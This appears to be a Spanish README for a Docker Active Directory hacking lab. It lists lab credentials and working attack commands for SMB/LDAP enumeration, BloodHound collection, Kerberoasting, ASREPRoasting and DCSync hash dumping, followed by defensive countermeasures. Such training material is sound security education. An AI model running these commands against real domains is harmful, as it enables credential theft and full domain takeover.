
# Active Directory Enumeration Lab

## 🎯 Objetivo
Aprender técnicas avanzadas de enumeración y ataque contra entornos Active Directory en un laboratorio controlado.

## 🏗️ Arquitectura del Lab

### Servicios Incluidos
- **Domain Controller (DC01)**: Windows Server 2019 con AD DS
- **Client Workstation (CLIENT01)**: Windows 10 unido al dominio
- **File Server (FS01)**: Servidor de archivos con shares vulnerables
- **Kali Attacker**: Máquina atacante con herramientas preinstaladas

### Red del Laboratorio
```
192.168.100.0/24
├── 192.168.100.10  - Domain Controller (DC01.LAB.LOCAL)
├── 192.168.100.20  - Client Workstation (CLIENT01.LAB.LOCAL)
├── 192.168.100.30  - File Server (FS01.LAB.LOCAL)
└── 192.168.100.100 - Kali Attacker
```

## 🚀 Inicio Rápido

### 1. Levantar el Laboratorio
```bash
docker-compose up -d
```

### 2. Verificar Estado
```bash
docker-compose ps
```

### 3. Acceder a las Máquinas

#### Kali Attacker (SSH)
```bash
ssh root@localhost -p 2222
# Password: toor
```

#### Domain Controller (RDP)
```bash
rdesktop localhost:3389
# Usuario: Administrator
# Password: P@ssw0rd123!
```

#### Client Workstation (RDP)
```bash
rdesktop localhost:3390
# Usuario: LAB\john.doe
# Password: Welcome123!
```

## 🔍 Ejercicios de Enumeración

### Fase 1: Reconocimiento Inicial

#### 1.1 Escaneo de Red
```bash
# Desde Kali
nmap -sC -sV 192.168.100.0/24
```

#### 1.2 Enumeración DNS
```bash
# Enumerar registros DNS
dig @192.168.100.10 LAB.LOCAL ANY
nslookup 192.168.100.10

# Buscar subdominios
dnsrecon -d LAB.LOCAL -n 192.168.100.10
```

#### 1.3 Enumeración SMB
```bash
# Enumerar shares
smbclient -L //192.168.100.10 -N
enum4linux -a 192.168.100.10

# Buscar shares nulos
smbmap -H 192.168.100.10 -u null -p ""
```

### Fase 2: Enumeración de Active Directory

#### 2.1 Enumeración LDAP
```bash
# Sin credenciales
ldapsearch -x -h 192.168.100.10 -s base namingcontexts

# Con credenciales (si las tienes)
ldapsearch -x -h 192.168.100.10 -D "LAB\john.doe" -w "Welcome123!" \
  -b "DC=LAB,DC=LOCAL" "(objectClass=user)"
```

#### 2.2 Recolección con BloodHound
```bash
# Desde Kali con credenciales válidas
bloodhound-python -u john.doe -p Welcome123! -ns 192.168.100.10 \
  -d LAB.LOCAL -c All

# Ejecutar BloodHound
neo4j start
bloodhound
```

#### 2.3 PowerView (desde Windows)
```powershell
# Importar PowerView
Import-Module .\PowerView.ps1

# Enumeración básica
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
```

### Fase 3: Ataques Específicos

#### 3.1 Kerberoasting
```bash
# Desde Kali
impacket-GetUserSPNs LAB.LOCAL/john.doe:Welcome123! \
  -dc-ip 192.168.100.10 -request

# Crackear hashes
hashcat -m 13100 kerberos_hashes.txt /opt/wordlists/rockyou.txt
```

#### 3.2 ASREPRoasting
```bash
# Buscar usuarios sin Kerberos pre-auth
impacket-GetNPUsers LAB.LOCAL/ -dc-ip 192.168.100.10 -request

# Con lista de usuarios
impacket-GetNPUsers LAB.LOCAL/john.doe:Welcome123! \
  -dc-ip 192.168.100.10 -request
```

#### 3.3 DCSync (si tienes privilegios)
```bash
# Volcar hashes de dominio
impacket-secretsdump LAB.LOCAL/Administrator:P@ssw0rd123!@192.168.100.10
```

## 📊 Análisis con BloodHound

### Consultas Útiles
1. **Find Shortest Paths to Domain Admins**
2. **Find Principals with DCSync Rights**
3. **Find Computers with Unconstrained Delegation**
4. **Find Users with Most Privileges**
5. **Shortest Paths from Kerberoastable Users**

### Ataques Comunes a Identificar
- **Kerberoasting**: Usuarios con SPNs
- **ASREPRoasting**: Usuarios sin pre-auth
- **Unconstrained Delegation**: Computadoras peligrosas
- **ACL Abuse**: Permisos heredados incorrectos

## 🛡️ Contramedidas

### Detección
- Monitor de autenticación Kerberos anómala
- Alertas por consultas LDAP masivas
- Detección de herramientas como BloodHound
- Análisis de logs de SMB

### Prevención
- Políticas de contraseñas robustas
- Desactivar Kerberos pre-auth solo cuando sea necesario
- Auditar y limpiar ACLs regularmente
- Implementar tiering administrativo
- Configurar constrained delegation

## 🧪 Escenarios Adicionales

### Escenario 1: Lateral Movement
1. Comprometer CLIENT01
2. Buscar credenciales cacheadas
3. Usar credenciales para acceder a FS01
4. Escalar a Domain Admin

### Escenario 2: Golden Ticket
1. Obtener hash de krbtgt
2. Crear Golden Ticket
3. Acceder a cualquier recurso del dominio

### Escenario 3: Silver Ticket
1. Obtener hash de cuenta de servicio
2. Crear Silver Ticket para servicio específico
3. Acceso persistente al servicio

## 📚 Recursos Adicionales
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
- [Impacket Tools](https://github.com/SecureAuthCorp/impacket)
- [AD Security Blog](https://adsecurity.org/)

## 🎯 Objetivos de Aprendizaje

Al completar este lab, deberías poder:
- ✅ Realizar enumeración completa de AD
- ✅ Usar BloodHound efectivamente
- ✅ Ejecutar ataques Kerberoasting/ASREPRoasting
- ✅ Analizar ACLs y delegaciones
- ✅ Identificar paths de escalada de privilegios
- ✅ Implementar contramedidas básicas

## 🛑 Notas de Seguridad
- Este lab es solo para propósitos educativos
- No usar técnicas en entornos de producción sin autorización
- Las credenciales son deliberadamente débiles para el aprendizaje
- Restablecer el lab después de cada sesión
